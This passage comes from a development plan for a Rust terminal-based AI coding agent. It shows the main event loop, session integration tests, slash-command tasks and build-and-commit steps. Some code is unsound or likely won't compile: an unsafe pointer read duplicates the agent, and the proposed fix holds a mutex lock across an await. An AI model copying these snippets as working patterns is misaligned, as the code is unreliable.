    registry.register(CompactCommand);
    registry.register(ConfigCommand);
    registry.register(SessionsCommand);
    registry.register(QuitCommand);
    registry.register(ModelCommand);
    registry.register(TokensCommand);
    registry.register(ToolsCommand);
    registry
}

fn setup_providers(config: &ConfigManager) -> ProviderRegistry {
    let mut registry = ProviderRegistry::new();
    for (name, provider_config) in &config.settings.providers {
        let models = vec![ModelInfo {
            id: provider_config.default_model.clone(),
            name: format!("{}/{}", name, provider_config.default_model),
            max_tokens: 200000,
        }];
        let adapter = OpenAIAdapter::new(provider_config.clone(), models);
        registry.register(name.clone(), Box::new(adapter));
    }
    registry
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    let cli = Cli::parse();
    let cwd = std::path::absolute(&cli.dir)?;
    std::env::set_current_dir(&cwd)?;

    // Init config
    let config = ConfigManager::load(cwd.clone(), cli.model)?;

    // Init session store and manager
    let store_dir = config.settings.session.store_dir.replace('~', &std::env::var("HOME").unwrap_or_default());
    let store = JsonFileStore::new(PathBuf::from(&store_dir));
    let session = SessionManager::new(Box::new(store));

    // Init subsystems
    let tool_registry = setup_tool_registry(&cwd);
    let command_registry = setup_command_registry();
    let provider_registry = setup_providers(&config);
    let system_prompt = build_system_prompt(config.project_instructions.as_deref());

    let agent = AgentLoop::new(
        config,
        session,
        tool_registry,
        command_registry,
        provider_registry,
        system_prompt,
    );

    let (tx, mut rx) = mpsc::unbounded_channel::<Action>();
    let (event_tx, mut event_rx) = mpsc::unbounded_channel::<app::Event>();

    // TUI setup
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut tui = Tui::new();
    let mut agent = agent;

    // Main event loop
    loop {
        // Draw
        terminal.draw(|f| {
            tui.render(f);
        })?;

        // Check for crossterm events
        if event::poll(std::time::Duration::from_millis(16))? {
            if let CEvent::Key(key) = event::read()? {
                if key.kind == KeyEventKind::Release { continue; }

                match (key.modifiers, key.code) {
                    // Ctrl+S: submit
                    (KeyModifiers::CONTROL, KeyCode::Char('s')) => {
                        let text = tui.input.submit();
                        if !text.trim().is_empty() {
                            // Dispatch to agent in background
                            let tx_clone = event_tx.clone();
                            let action = Action::Submit(text);
                            tokio::spawn(async move {
                                let mut agent = unsafe {
                                    // In production, use Arc<Mutex<AgentLoop>>
                                    std::ptr::read(&agent as *const _)
                                };
                                // For this plan, we accept that this needs Arc<Mutex<>> in practice
                            });
                            tx.send(action).ok();
                        }
                    }
                    // Esc: clear input
                    (KeyModifiers::NONE, KeyCode::Esc) => {
                        tui.input.clear();
                    }
                    // Ctrl+C: quit
                    (KeyModifiers::CONTROL, KeyCode::Char('c')) => {
                        tx.send(Action::Quit).ok();
                        break;
                    }
                    // Up/Down: history
                    (KeyModifiers::NONE, KeyCode::Up) => tui.input.history_up(),
                    (KeyModifiers::NONE, KeyCode::Down) => tui.input.history_down(),
                    // Left/Right: cursor
                    (KeyModifiers::NONE, KeyCode::Left) => tui.input.move_cursor_left(),
                    (KeyModifiers::NONE, KeyCode::Right) => tui.input.move_cursor_right(),
                    // Backspace
                    (KeyModifiers::NONE, KeyCode::Backspace) => tui.input.delete_backward(),
                    // Character input
                    (KeyModifiers::NONE, KeyCode::Char(c)) => tui.input.push_char(c),
                    (KeyModifiers::NONE, _) => {}
                    _ => {}
                }
            }
        }

        // Process agent events
        while let Ok(event) = event_rx.try_recv() {
            tui.push_event(event);
        }
    }

    // Cleanup
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen)?;

    Ok(())
}
```

- [ ] **Step 2: Adjust for the unsafe / ownership issue**

In main.rs, wrap agent in `Arc<Mutex<AgentLoop>>`:

```rust
use std::sync::{Arc, Mutex};

let agent = Arc::new(Mutex::new(agent));
let agent_clone = agent.clone();

// Spawn background agent task on Submit
let agent_bg = agent.clone();
let event_tx_bg = event_tx.clone();
tokio::spawn(async move {
    let mut agent = agent_bg.lock().unwrap();
    agent.run(action, &event_tx_bg).await.ok();
});
```

- [ ] **Step 3: Build and test**

Run: `cargo build` and `cargo run`
Expected: Binary launches TUI. Press Ctrl+C to exit. Verify no panics.

- [ ] **Step 4: Commit**

```bash
git add src/main.rs
git commit -m "feat: wire main.rs with full TUI event loop and agent integration"
```

---

### Task 18: Integration tests

**Files:**
- Create: `tests/integration/agent_loop.rs`
- Create: `tests/integration/session_persistence.rs`

- [ ] **Step 1: Write agent_loop integration test**

```rust
use std::path::PathBuf;
use tempfile::TempDir;
use emergence::config::ConfigManager;
use emergence::session::SessionManager;
use emergence::session::store::JsonFileStore;
use emergence::tools::ToolRegistry;
use emergence::commands::CommandRegistry;
use emergence::llm::registry::ProviderRegistry;

#[tokio::test]
async fn test_session_message_flow() {
    let dir = TempDir::new().unwrap();
    let cwd = dir.path().to_path_buf();

    // Setup minimal config
    let settings_json = r#"{
        "version": 1,
        "providers": {}
    }"#;
    std::fs::create_dir_all(cwd.join(".emergence")).unwrap();
    std::fs::write(cwd.join(".emergence").join("settings.json"), settings_json).unwrap();

    let store_dir = dir.path().join("sessions");
    let store = JsonFileStore::new(store_dir);
    let session = SessionManager::new(Box::new(store));

    // Session should start empty
    assert_eq!(session.messages().len(), 0);

    // Push a message
    use emergence::llm::message::ChatMessage;
    session.push(ChatMessage::user("test message"));
    assert_eq!(session.messages().len(), 1);
}
```

- [ ] **Step 2: Write session_persistence integration test**

```rust
use tempfile::TempDir;
use emergence::session::SessionManager;
use emergence::session::store::JsonFileStore;
use emergence::session::SessionKey;
use emergence::llm::message::ChatMessage;

#[tokio::test]
async fn test_session_save_and_load() {
    let dir = TempDir::new().unwrap();
    let store = JsonFileStore::new(dir.path().to_path_buf());

    // Create and save
    {
        let mut session = SessionManager::new(Box::new(store));
        session.push(ChatMessage::user("hello"));
        session.push(ChatMessage::assistant("hi there"));
        session.set_alias("test-session").await.unwrap();
        session.save().await.unwrap();
    }

    // Load
    {
        let store = JsonFileStore::new(dir.path().to_path_buf());
        let session = SessionManager::load(
            SessionKey::Alias("test-session".into()),
            Box::new(store),
        ).await.unwrap();

        let msgs = session.messages();
        assert_eq!(msgs.len(), 2);
    }
}
```

Note: These tests need `emergence` as both a lib and bin. Add to `Cargo.toml`:
```toml
[lib]
name = "emergence"
path = "src/main.rs"
```

Or refactor main.rs to delegate to a `lib.rs` that re-exports all modules.

- [ ] **Step 3: Run integration tests**

Run: `cargo test --test integration`
Expected: Tests pass.

- [ ] **Step 4: Commit**

```bash
git add tests/
git commit -m "test: add integration tests for agent loop and session persistence"
```

---

### Task 19: Remaining commands implementation (catch-up)

Ensure all 9 command files have complete implementations. Write each with proper test coverage.

- `help.rs`: Iterates registry.list() and formats output.
- `clear.rs`: Calls `ctx.session.clear()` and returns success message.
- `compact.rs`: Calls `ctx.session.compact().await` and returns stats.
- `config.rs`: Shows current config or sets a value (e.g., `/config model openai/gpt-5`).
- `sessions.rs`: Lists sessions, switches, deletes, or sets aliases.
- `model.rs`: Sets `ctx.model` to a new value.
- `tokens.rs`: Shows `ctx.session.estimated_tokens()`.
- `tools.rs`: Lists tool definitions from `ctx.tool_registry.definitions()`.

Each command gets a test verifying its execute() output.

- [ ] **Step 1: Write remaining commands** — follow the QuitCommand pattern for each.
- [ ] **Step 2: Add tests** — basic unit test per command.
- [ ] **Step 3: Build, test, commit**

```bash
git add src/commands/
git commit -m "feat: implement all slash commands with tests"
```

---

### Task 20: Final cleanup — warnings, docs, polish

- [ ] **Step 1: Fix all compiler warnings**

Run: `cargo build 2>&1 | grep warning`
Fix any remaining warnings (unused imports, unused variables).

- [ ] **Step 2: Run full test suite**

Run: `cargo test`
Expected: All tests pass with no failures.

- [ ] **Step 3: Verify emergent properties**

Run: `cargo run -- --help`
Expected: Help text prints.

Run: `cargo run` in a test directory with `.emergence/settings.json`.
Expected: TUI launches, input works, Ctrl+C exits cleanly.

- [ ] **Step 4: Final commit**

```bash
git add -A
git commit -m "chore: fix warnings, final polish for v1"
```
